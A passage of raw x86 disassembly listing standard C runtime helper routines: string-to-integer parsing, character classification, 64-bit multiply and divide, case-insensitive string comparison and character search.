  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
